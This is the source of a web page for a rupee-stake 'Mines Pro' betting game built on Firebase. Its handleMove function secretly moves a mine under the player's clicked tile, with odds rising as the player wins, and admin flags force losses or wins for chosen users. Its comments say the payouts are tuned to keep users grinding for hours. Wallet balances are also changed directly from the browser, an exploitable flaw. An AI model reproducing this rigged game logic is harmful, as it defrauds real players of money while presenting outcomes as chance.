<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mines Pro | Live Session</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #6366f1; --surface: #1e293b; --bg: #0f172a; --success: #10b981; --danger: #ef4444; --accent: #fbbf24; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; color: white; }
        .game-shell { width: 100%; max-width: 400px; min-height: 100vh; background: #111827; padding: 15px; box-sizing: border-box; }
        .header { display: flex; justify-content: space-between; align-items: center; background: var(--surface); padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 15px; }
        .slot { aspect-ratio: 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; cursor: pointer; transition: 0.2s; box-shadow: inset 0 0 8px rgba(0,0,0,0.5); border: 2px solid transparent; }
        .slot.diamond { background: radial-gradient(circle, #06b6d4, #083344); border-color: #22d3ee; }
        .slot.bomb { background: radial-gradient(circle, #ef4444, #7f1d1d); border-color: #f87171; }
        .bet-area { background: #1e293b; padding: 15px; border-radius: 15px; }
        input { width: 100%; background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 10px; color: white; margin: 10px 0; text-align: center; font-weight: bold; }
        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        .btn-start { background: var(--primary); color: white; }
        .btn-cash { background: var(--success); color: white; display: none; }
    </style>
</head>
<body>

<div class="game-shell">
    <div class="header">
        <span style="font-weight:900;">MINES <span style="color:var(--primary)">PRO</span></span>
        <div style="color:var(--accent); font-weight:800;">₹<span id="bal">0.00</span></div>
    </div>

    <div class="grid" id="gameGrid"></div>

    <div class="bet-area">
        <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:10px;">
            <span>MULT: <span id="mText" style="color:var(--accent)">1.00x</span></span>
            <span>PROFIT: <span id="pText" style="color:var(--success)">₹0.00</span></span>
        </div>
        <input type="number" id="betInp" value="10">
        <button id="sBtn" class="btn btn-start" onclick="startGame()">START GAME</button>
        <button id="cBtn" class="btn btn-cash" onclick="cashout()">CASHOUT</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
    import { getDatabase, ref, onValue, update, increment, get, onDisconnect, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", authDomain: "test-eb5e7.firebaseapp.com", databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", projectId: "test-eb5e7", appId: "1:366282855653:web:dca7e000f5a22fb11f300c" };
    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getDatabase(app);

    let balance = 0, isPlaying = false, mines = [], diamonds = 0, activeBet = 0;
    
    // Naye Hardcore Multipliers (4 Mines system ke liye): 
    // Isse ₹0 se ₹100 tak grind karne me user ko 2 se 3 ghante lagenge kyunki returns slow aur high-risk hain.
    const mTable = [1.08, 1.15, 1.24, 1.35, 1.48, 1.62, 1.78, 1.96, 2.18, 2.44, 2.75, 3.12, 3.58, 4.15, 4.88, 5.85, 7.20, 9.15, 12.20, 17.50, 28.00];

    // --- LIVE PRESENCE SYSTEM & WALLET SYNC ---
    onAuthStateChanged(auth, user => {
        if(!user) return;
        
        const statusRef = ref(db, `users/${user.uid}/isOnline`);
        const connectedRef = ref(db, ".info/connected");
        onValue(connectedRef, (snap) => {
            if (snap.val() === true) {
                set(statusRef, true);
                onDisconnect(statusRef).set(false);
            }
        });

        onValue(ref(db, `user_wallet/${user.uid}/balance`), s => {
            if(s.exists()){
                balance = parseFloat(s.val()) || 0;
                document.getElementById("bal").innerText = balance.toFixed(2);
            } else {
                balance = 0;
                document.getElementById("bal").innerText = "0.00";
            }
        });
    });

    const grid = document.getElementById("gameGrid");
    for(let i=0; i<25; i++) {
        const d = document.createElement("div"); d.className="slot";
        d.onclick = () => handleMove(i, d); grid.appendChild(d);
    }

    window.startGame = async () => {
        if(!auth.currentUser) return;
        activeBet = parseFloat(document.getElementById("betInp").value);
        if(activeBet > balance || activeBet < 1) return alert(" MINIMUM 1₹ BET");
        
        await update(ref(db, `user_wallet/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
        
        isPlaying = true; 
        diamonds = 0; 
        mines = [];
        
        // 4 MINES SETUP
        while(mines.length < 4) { 
            let r = Math.floor(Math.random()*25); 
            if(!mines.includes(r)) mines.push(r); 
        }
        
        document.getElementById("sBtn").style.display="none";
        document.getElementById("cBtn").style.display="block";
        document.getElementById("cBtn").innerText = "CASHOUT";
        document.getElementById("mText").innerText = "1.00x";
        document.getElementById("pText").innerText = "₹0.00";
        
        document.querySelectorAll(".slot").forEach(s=>{
            s.className="slot"; 
            s.innerText="";
        });
    };

    window.handleMove = async (idx, el) => {
        if(!isPlaying || el.classList.contains('diamond') || el.classList.contains('bomb')) return;
        
        // Admin force settings intact rakhna
        const uSnap = await get(ref(db, `users/${auth.currentUser.uid}`));
        const sSnap = await get(ref(db, `settings/mines/globalTrap`));
        const uData = uSnap.exists() ? uSnap.val() : {};
        
        let risk = 0;
        if(sSnap.val() && idx === 0) risk = 1.0; 
        else if(uData.forceLoss) risk = 1.0;
        else if(uData.forceWin) risk = 0.0;
        else {
            if(diamonds < 2) risk = 0.1; 
            else if(diamonds < 6) risk = 0.4;
            else risk = 0.75;
        }

        if(Math.random() < risk && !uData.forceWin) { 
            if(!mines.includes(idx)){
                mines.pop(); 
                mines.push(idx);
            } 
        }

        if(mines.includes(idx)) {
            isPlaying = false;
            mines.forEach(m => { 
                grid.children[m].classList.add("bomb"); 
                grid.children[m].innerText="💣"; 
            });
            setTimeout(()=> { 
                alert("Lost ₹" + activeBet.toFixed(2)); 
                resetUI(); 
            }, 500);
        } else {
            diamonds++; 
            el.innerText="💎"; 
            el.classList.add("diamond");
            
            let m = mTable[diamonds-1] || 28.00;
            let currentProfit = activeBet * m;
            
            document.getElementById("mText").innerText = m.toFixed(2)+"x";
            document.getElementById("pText").innerText = "₹" + currentProfit.toFixed(2);
            document.getElementById("cBtn").innerText = `CASHOUT ₹${currentProfit.toFixed(2)}`;

            // Agar saare 21 diamonds dhoond liye toh auto-cashout safely
            if(diamonds === 21) {
                window.cashout();
            }
        }
    };

    window.cashout = async () => {
        if(!isPlaying || diamonds === 0) return;
        isPlaying = false;
        
        let m = mTable[diamonds-1] || 28.00;
        let winAmount = activeBet * m;
        
        await update(ref(db, `user_wallet/${auth.currentUser.uid}`), { balance: increment(winAmount) });
        alert("Won ₹" + winAmount.toFixed(2));
        resetUI();
    };

    function resetUI() {
        isPlaying = false;
        document.getElementById("sBtn").style.display="block";
        document.getElementById("cBtn").style.display="none";
    }
</script>
</body>
</html>
